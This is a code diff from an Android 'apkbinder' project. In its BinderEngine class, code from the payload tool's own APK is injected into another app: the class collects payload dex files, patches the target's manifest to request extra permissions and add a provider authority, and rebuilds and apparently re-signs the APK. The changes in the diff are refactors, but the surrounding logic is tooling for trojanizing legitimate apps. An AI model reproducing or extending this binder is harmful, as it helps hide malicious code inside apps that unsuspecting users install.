@@ -1,13 +1,14 @@
 package Com.devhs.apkbinder.binder
 
 import android.content.Context
+import android.content.pm.PackageInfo
 import android.net.Uri
 import androidx.documentfile.provider.DocumentFile
 import com.android.apksig.ApkSigner
 import Com.devhs.apkbinder.core.Const
 import Com.devhs.apkbinder.data.Feature
 import Com.devhs.apkbinder.data.LogLevel
-import com.devhs.apkbinder.data.PayloadConfig
+import Com.devhs.apkbinder.data.PayloadConfig
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.ByteArrayOutputStream
@@ -63,7 +64,7 @@ class BinderEngine(private val context: Context) {
         try {
             if (label.isNotBlank()) onLog(LogLevel.INFO, "App: $label")
 
-            val src = resolveSource(source)
+            val src: File? = resolveSource(source)
             if (src == null) {
                 onLog(LogLevel.ERROR, "Source APK not readable")
                 return@withContext BindResult(false, "Source not readable")
@@ -77,18 +78,18 @@ class BinderEngine(private val context: Context) {
                 return@withContext BindResult(false, "Parse failed")
             }
 
-            val pkg = info.packageName
+            val pkg: String = info.packageName
             onLog(LogLevel.INFO, "Package: $pkg")
 
-            val splits = splitApks(pkg)
+            val splits: List<File> = splitApks(pkg)
             if (splits.isNotEmpty()) onLog(LogLevel.INFO, "Split APKs: ${splits.size}")
 
-            val permissions = buildPermissions(features, config.features)
+            val permissions: List<String> = buildPermissions(features, config.features)
             onLog(LogLevel.INFO, "Permissions requested: ${permissions.size}")
 
-            val authority = pkg + Const.AUTHORITY_SUFFIX
+            val authority: String = pkg + Const.AUTHORITY_SUFFIX
 
-            val payloadDexes = collectPayloadDexes()
+            val payloadDexes: List<ByteArray> = collectPayloadDexes()
             if (payloadDexes.isEmpty()) {
                 onLog(LogLevel.ERROR, "Payload dex not found in own APK")
                 return@withContext BindResult(false, "Payload dex missing")
@@ -107,7 +108,7 @@ class BinderEngine(private val context: Context) {
                     return@withContext BindResult(false, "Manifest missing")
                 }
 
-                val manifest = zip.getInputStream(entry).use { it.readBytes() }
+                val manifest: ByteArray = zip.getInputStream(entry).use { it.readBytes() }
 
                 patched = AxmlPatcher.patch(
                     manifest,
@@ -119,13 +120,13 @@ class BinderEngine(private val context: Context) {
                     splits.isNotEmpty()
                 )
 
-                val patchedBytes = patched
+                val patchedBytes: ByteArray? = patched
                 if (patchedBytes == null) {
                     onLog(LogLevel.ERROR, "Manifest patch failed")
                     return@withContext BindResult(false, "Manifest patch failed")
                 }
 
-                var slot = maxDexIndex(zip)
+                var slot: Int = maxDexIndex(zip)
                 val seen = HashSet<String>()
 
                 FileOutputStream(temp).use { fos ->
@@ -246,15 +247,18 @@ class BinderEngine(private val context: Context) {
     }
 
     private fun splitApks(pkg: String): List<File> {
-        return try {
-            val pi = context.packageManager.getPackageInfo(pkg, 0)
-            val dirs = pi.splitSourceDirs ?: return emptyList()
-            dirs.mapNotNull { p ->
+        try {
+            val pi: PackageInfo = context.packageManager.getPackageInfo(pkg, 0)
+            val dirs: Array<String>? = pi.splitSourceDirs
+            if (dirs == null) return emptyList()
+            val out = ArrayList<File>()
+            for (p in dirs) {
                 val f = File(p)
-                if (f.exists()) f else null
+                if (f.exists()) out.add(f)
             }
+            return out
         } catch (t: Throwable) {
-            emptyList()
+            return emptyList()
         }
     }
 
